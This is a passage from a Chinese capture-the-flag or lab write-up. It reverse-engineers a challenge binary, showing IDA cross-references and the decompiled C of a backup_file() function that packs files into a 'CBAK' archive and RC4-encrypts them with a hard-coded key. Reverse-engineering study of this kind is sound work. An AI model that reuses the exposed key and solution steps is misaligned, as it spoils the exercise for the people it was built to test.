plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>那么，查看 <code>calculate_md5()</code> 函数的交叉引用</p>
<p><img decoding="async" loading="lazy" alt="img" src="https://tryhackmyoffsecbox.github.io/Target-Machines-WriteUp/assets/images/image_20241141-214129-4254f642abaa2f7bfe030b1758f08738.png" width="934" height="253" class="img_ev3q"></p>
<p>可以看到 <code>backup_file()</code> 函数和 <code>restore_files()</code> 函数都引用了 <code>calculate_md5()</code> 函数</p>
<p>以 <code>backup_file()</code> 函数为例，进行分析</p>
<div class="language-c codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-c codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token keyword" style="color:#00009f">void</span><span class="token plain"> __cdecl </span><span class="token function" style="color:#d73a49">backup_file</span><span class="token punctuation" style="color:#393A34">(</span><span class="token keyword" style="color:#00009f">const</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">char</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">*</span><span class="token plain">file_dir</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    __int64 v1</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"> </span><span class="token comment" style="color:#999988;font-style:italic">// rdx</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">int</span><span class="token plain"> file</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"> </span><span class="token comment" style="color:#999988;font-style:italic">// eax</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token class-name">size_t</span><span class="token plain"> v3</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"> </span><span class="token comment" style="color:#999988;font-style:italic">// rax</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">char</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">*</span><span class="token plain">v4</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"> </span><span class="token comment" style="color:#999988;font-style:italic">// rcx</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    __int64 v5</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"> </span><span class="token comment" style="color:#999988;font-style:italic">// rdx</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    __int64 v6</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"> </span><span class="token comment" style="color:#999988;font-style:italic">// rdx</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    __int64 v7</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"> </span><span class="token comment" style="color:#999988;font-style:italic">// rdx</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">int</span><span class="token plain"> index</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"> </span><span class="token comment" style="color:#999988;font-style:italic">// [rsp+18h] [rbp-DE8h]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">int</span><span class="token plain"> indexa</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"> </span><span class="token comment" style="color:#999988;font-style:italic">// [rsp+18h] [rbp-DE8h]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">int</span><span class="token plain"> file_block_buf_offset</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"> </span><span class="token comment" style="color:#999988;font-style:italic">// [rsp+1Ch] [rbp-DE4h]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">int</span><span class="token plain"> file_info_buf_offset</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"> </span><span class="token comment" style="color:#999988;font-style:italic">// [rsp+20h] [rbp-DE0h]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">int</span><span class="token plain"> hidden_file_count</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"> </span><span class="token comment" style="color:#999988;font-style:italic">// [rsp+24h] [rbp-DDCh]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">int</span><span class="token plain"> count</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"> </span><span class="token comment" style="color:#999988;font-style:italic">// [rsp+28h] [rbp-DD8h]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">int</span><span class="token plain"> final_file_buf_offset</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"> </span><span class="token comment" style="color:#999988;font-style:italic">// [rsp+2Ch] [rbp-DD4h]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    __int64 current_file_size</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"> </span><span class="token comment" style="color:#999988;font-style:italic">// [rsp+38h] [rbp-DC8h]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token class-name">size_t</span><span class="token plain"> i</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"> </span><span class="token comment" style="color:#999988;font-style:italic">// [rsp+40h] [rbp-DC0h]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token class-name">size_t</span><span class="token plain"> i_0</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"> </span><span class="token comment" style="color:#999988;font-style:italic">// [rsp+48h] [rbp-DB8h]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">char</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">*</span><span class="token plain">file_block_buf</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"> </span><span class="token comment" style="color:#999988;font-style:italic">// [rsp+50h] [rbp-DB0h]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">char</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">*</span><span class="token plain">final_file_buffer</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"> </span><span class="token comment" style="color:#999988;font-style:italic">// [rsp+58h] [rbp-DA8h]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">char</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">*</span><span class="token plain">file_buffer</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"> </span><span class="token comment" style="color:#999988;font-style:italic">// [rsp+60h] [rbp-DA0h]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">char</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">*</span><span class="token plain">file_name_start</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"> </span><span class="token comment" style="color:#999988;font-style:italic">// [rsp+70h] [rbp-D90h]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token class-name">size_t</span><span class="token plain"> file_buffer_length</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"> </span><span class="token comment" style="color:#999988;font-style:italic">// [rsp+78h] [rbp-D88h]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">char</span><span class="token plain"> log_file_name</span><span class="token punctuation" style="color:#393A34">[</span><span class="token number" style="color:#36acaa">20</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"> </span><span class="token comment" style="color:#999988;font-style:italic">// [rsp+80h] [rbp-D80h] BYREF</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">char</span><span class="token plain"> current_file_name</span><span class="token punctuation" style="color:#393A34">[</span><span class="token number" style="color:#36acaa">24</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"> </span><span class="token comment" style="color:#999988;font-style:italic">// [rsp+A0h] [rbp-D60h] BYREF</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">char</span><span class="token plain"> current_file_info</span><span class="token punctuation" style="color:#393A34">[</span><span class="token number" style="color:#36acaa">32</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"> </span><span class="token comment" style="color:#999988;font-style:italic">// [rsp+C0h] [rbp-D40h] BYREF</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">char</span><span class="token plain"> log_message</span><span class="token punctuation" style="color:#393A34">[</span><span class="token number" style="color:#36acaa">256</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"> </span><span class="token comment" style="color:#999988;font-style:italic">// [rsp+E0h] [rbp-D20h] BYREF</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">char</span><span class="token plain"> file_info_buf</span><span class="token punctuation" style="color:#393A34">[</span><span class="token number" style="color:#36acaa">1024</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"> </span><span class="token comment" style="color:#999988;font-style:italic">// [rsp+1E0h] [rbp-C20h] BYREF</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">char</span><span class="token plain"> file_name_buf</span><span class="token punctuation" style="color:#393A34">[</span><span class="token number" style="color:#36acaa">2048</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"> </span><span class="token comment" style="color:#999988;font-style:italic">// [rsp+5E0h] [rbp-820h] BYREF</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">unsigned</span><span class="token plain"> __int64 v29</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"> </span><span class="token comment" style="color:#999988;font-style:italic">// [rsp+DE8h] [rbp-18h]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    v29 </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">__readfsqword</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">0x28u</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    count </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">get_file_names_unix</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">file_dir</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> file_name_buf</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">2048</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    file_block_buf </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token keyword" style="color:#00009f">char</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">*</span><span class="token punctuation" style="color:#393A34">)</span><span class="token function" style="color:#d73a49">malloc</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">0xA00000uLL</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    final_file_buffer </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token keyword" style="color:#00009f">char</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">*</span><span class="token punctuation" style="color:#393A34">)</span><span class="token function" style="color:#d73a49">malloc</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">0xA00000uLL</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    hidden_file_count </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    index </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">for</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">i </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0LL</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"> i </span><span class="token operator" style="color:#393A34">&lt;</span><span class="token plain"> count</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">++</span><span class="token plain">i</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token keyword" style="color:#00009f">if</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">file_name_buf</span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">index </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">1</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">strlen</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">file_dir</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">==</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">46</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token operator" style="color:#393A34">++</span><span class="token plain">hidden_file_count</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        index </span><span class="token operator" style="color:#393A34">+=</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">strlen</span><span class="token punctuation" style="color:#393A34">(</span><span class="token operator" style="color:#393A34">&amp;</span><span class="token plain">file_name_buf</span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">index</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">1</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token function" style="color:#d73a49">memcpy</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">final_file_buffer</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">"CBAK"</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">4uLL</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token function" style="color:#d73a49">memcpy</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">final_file_buffer </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">20</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">"3.85.4h6"</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">8uLL</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token function" style="color:#d73a49">memset</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">log_file_name</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">sizeof</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">log_file_name</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token function" style="color:#d73a49">memcpy</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">log_file_name</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">"backup.log"</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0xAuLL</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    v1 </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">*</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">_QWORD </span><span class="token operator" style="color:#393A34">*</span><span class="token punctuation" style="color:#393A34">)</span><span class="token operator" style="color:#393A34">&amp;</span><span class="token plain">log_file_name</span><span class="token punctuation" style="color:#393A34">[</span><span class="token number" style="color:#36acaa">8</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token operator" style="color:#393A34">*</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">_QWORD </span><span class="token operator" style="color:#393A34">*</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">final_file_buffer </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">28</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">*</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">_QWORD </span><span class="token operator" style="color:#393A34">*</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain">log_file_name</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token operator" style="color:#393A34">*</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">_QWORD </span><span class="token operator" style="color:#393A34">*</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">final_file_buffer </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">36</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> v1</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token operator" style="color:#393A34">*</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">_DWORD </span><span class="token operator" style="color:#393A34">*</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain">final_file_buffer </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">11</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">*</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">_DWORD </span><span class="token operator" style="color:#393A34">*</span><span class="token punctuation" style="color:#393A34">)</span><span class="token operator" style="color:#393A34">&amp;</span><span class="token plain">log_file_name</span><span class="token punctuation" style="color:#393A34">[</span><span class="token number" style="color:#36acaa">16</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    indexa </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    file_info_buf_offset </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    file_block_buf_offset </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    file_buffer </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token keyword" style="color:#00009f">char</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">*</span><span class="token punctuation" style="color:#393A34">)</span><span class="token function" style="color:#d73a49">malloc</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">0xA00000uLL</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">for</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">i_0 </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0LL</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"> i_0 </span><span class="token operator" style="color:#393A34">&lt;</span><span class="token plain"> count</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">++</span><span class="token plain">i_0</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token keyword" style="color:#00009f">if</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">file_name_buf</span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">indexa </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">1</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">strlen</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">file_dir</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">!=</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">46</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            </span><span class="token function" style="color:#d73a49">memset</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">current_file_name</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">sizeof</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">current_file_name</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            file_name_start </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">&amp;</span><span class="token plain">file_name_buf</span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">indexa </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">1</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">strlen</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">file_dir</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            </span><span class="token function" style="color:#d73a49">strncpy</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">current_file_name</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> file_name_start</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x17uLL</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            file </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">read_file</span><span class="token punctuation" style="color:#393A34">(</span><span class="token operator" style="color:#393A34">&amp;</span><span class="token plain">file_name_buf</span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">indexa</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> file_buffer</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            file_buffer_length </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> file</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            </span><span class="token keyword" style="color:#00009f">if</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">file</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                </span><span class="token function" style="color:#d73a49">rc4_encrypt</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">"30048-0bea264-c01c6ea3-e5047d488"</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">32</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token keyword" style="color:#00009f">unsigned</span><span class="token plain"> __int8 </span><span class="token operator" style="color:#393A34">*</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain">file_buffer</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> file</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                </span><span class="token function" style="color:#d73a49">LODWORD</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">current_file_size</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> file_buffer_length</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                </span><span class="token function" style="color:#d73a49">HIDWORD</span><span class="token punctuation" style="color:#393A34">(</span><span class="token 